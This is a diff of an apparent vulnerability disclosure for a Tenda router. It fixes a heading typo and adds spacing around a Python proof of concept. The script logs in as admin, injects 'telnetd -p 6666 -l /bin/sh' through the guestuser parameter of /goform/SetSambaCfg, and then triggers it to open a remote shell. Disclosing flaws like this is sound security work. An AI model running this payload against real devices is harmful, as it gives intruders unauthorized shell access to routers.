@@ -3,7 +3,7 @@
 I found a command injection vulnerability in the Tenda router's webserver. While processing the `guestuser` parameters for a post request to `/goform/SetSambaCfg`, the payload is directly stored into NVRAM. When a post request is sent again to `/goform/SetSambaCfg`, the payload is read from NVRAM and executed. It's like Second-Order SQL Injection Attack. The details are shown below:
 
 
-## Overviw
+## Overview
 
 Vendor: Tenda
 
@@ -47,12 +47,15 @@ s = requests.session()
 s.headers.update(header)
 
 # login 
+
 login_req = s.post("http://192.168.0.1/login/Auth", data="username=admin&password=70ebc4f9c9d22827a5874d1bb6f06abd")
 
 # First, store telnet payload into NVRAM. `telenetd -p 6666 -l /bin/sh` 
+
 req = s.post("http://192.168.0.1/goform/SetSambaCfg", data="fileCode=UTF-8&password=admin&premitEn=0&guestpwd=guests&guestuser=guest1%3btelnetd%20-p%206666%20-l%20/bin/sh%3b&guestaccess=r&internetPort=21")
 
 # Second, send a post request again, trigger the vulnerability.
+
 req = s.post("http://192.168.0.1/goform/SetSambaCfg", data="fileCode=UTF-8&password=admin&premitEn=0&guestpwd=guests&guestuser=guest1&guestaccess=r&internetPort=21")
 print(req.text)
 
